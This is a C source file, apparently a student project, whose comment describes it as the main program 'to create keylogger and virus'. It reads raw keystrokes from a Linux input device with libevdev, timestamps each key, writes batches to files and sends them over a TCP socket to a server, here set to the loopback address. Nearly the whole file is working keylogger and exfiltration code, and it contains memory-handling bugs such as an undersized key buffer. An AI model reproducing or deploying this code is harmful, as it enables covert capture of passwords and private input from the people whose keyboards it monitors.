/*
Main function to run to create keylogger and virus
*/

#include <arpa/inet.h>
#include <libevdev/libevdev.h>
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

#include "client.h"
#include "keylogger.h"
#include "server_utils.h"

const socklen_t MAX_IP_ADDR_LEN = 16;

int main(void) {
  // Open a TCP socket to connect to the server.
  int socket_descriptor = open_tcp_socket();
  (void)fprintf(stderr, "Client socket descriptor: %d.\n", socket_descriptor);

  // Connect to the server running on this machine (127.0.0.1).
  struct sockaddr_in server_addr = socket_address(INADDR_LOOPBACK, PORT);
  try_connect(socket_descriptor, server_addr);
  // To print an IP address as a string, we need to allocate a buffer.
  char addr_string[MAX_IP_ADDR_LEN];
  (void)fprintf(
      stderr, "Connected to server at %s, port %d.\n",
      inet_ntop(AF_INET, &server_addr.sin_addr, addr_string, MAX_IP_ADDR_LEN),
      PORT);

  // Use a file pointer to make it easier to deal with text lines.
  // FILE* socket_file = get_socket_file(socket_descriptor);

  FILE* socket_file = fdopen(socket_descriptor, "w+");
  if (socket_file == NULL) {
    error_and_exit("Couldn't open socket as file stream.");
  }

  key_package pack;
  pack.keys_arr_size = 0;
  pack.keys = malloc(sizeof(char));
  key_package* package = &pack;

  log_device(package);
  //  if (socket_file == NULL) {
  //    printf("socket file is null\n");
  //  }

  // Send data until either the client or the server closes its stream.
  int socket_file_status = 0;
  //   // http://who-t.blogspot.com/2013/09/libevdev-handling-input-events.html
  int timer_counter = 20000000;  // 20000000

  // open a device, as libevdev expects a file descriptor. You should have root
  // permissions
  struct libevdev* keyboard_dev;
  int rc;

  // get keyboard inputs event file
  int keyboard_fd = open("/dev/input/event3", O_RDONLY | O_NONBLOCK);
  if (keyboard_fd < 0) {
    fprintf(stderr, "Error opening event3 file: %d %s\n", errno,
            strerror(errno));
    exit(0);
  }
  rc = libevdev_new_from_fd(keyboard_fd, &keyboard_dev);
  if (rc < 0) {
    fprintf(stderr, "Error with setting rc: %d %s\n", -rc, strerror(-rc));
    exit(0);
  }
  int file_name_counter = 0;
  int counter = 0;
  while (socket_file_status != -1) {
    ++counter;
    struct input_event ev;

    // other options: LIBEVDEV_READ_FLAG_NORMAL
    rc = libevdev_next_event(keyboard_dev, LIBEVDEV_READ_FLAG_BLOCKING, &ev);
    if (rc < 0) {
      // note that this section runs when no event is occurring, NOT necessarily
      // when there is an error printf("value of rc: %d\n", rc);
      if (rc != -EAGAIN) printf("1 error: %d %s\n", -rc, strerror(-rc));
    } else if (rc == LIBEVDEV_READ_STATUS_SUCCESS) {
      // handle event here

      // each key press/lift generates 3 events: EV_MSC, EV_SYN, and EV_KEY
      // we only care about EV_KEY, represented by ev.type == 1
      if (ev.type == 1) {
        if (ev.value == 1 || ev.value == 2) {
          // get current time
          time_t rawtime;
          struct tm* timeinfo;
          time(&rawtime);
          timeinfo = localtime(&rawtime);

          // make key struct, add to key package. do the file writing in another
          // file
          key_info pressed_key = {
              .key = libevdev_event_code_get_name(ev.type, ev.code),
              .timestamp = asctime(timeinfo)};

          // append to key_package->keys
          package->keys[package->keys_arr_size] = pressed_key;
          package->keys_arr_size++;

          // printf("New key_package array size: %ld\n",
          // key_package->keys_arr_size);
        }
      }
    } else {
      printf("Unsure of what is going on here..\n");
    }

    if (counter == timer_counter) {
      counter = 0;
      // read and write and whee

      // convert int to str
      print_logged_keys(*package);
      char str[20];
      sprintf(str, "in_%d", file_name_counter);
      char* file_name = strcat(str, ".txt");
      FILE* package_log = fopen(file_name, "w");
      if (package_log == NULL) {
        error_and_exit("Couldn't open file");
      }
      keys_to_file(package_log, *package);
      // call send data functoin on package_log

      if (package->keys_arr_size != 0) {
        reset_structs(package);
      }
      ++file_name_counter;

      FILE* read_log = fopen(file_name, "r");
      send_data(socket_file, read_log);

      fclose(package_log);
    }

    if (ev.code == 107) {
      // if (log_indicator == 0) {
      printf("\nExiting.\n");

      break;
    }
  }
  // Clean up
  libevdev_free(keyboard_dev);
  close(keyboard_fd);
  close_tcp_socket(socket_descriptor);
  return 0;
}
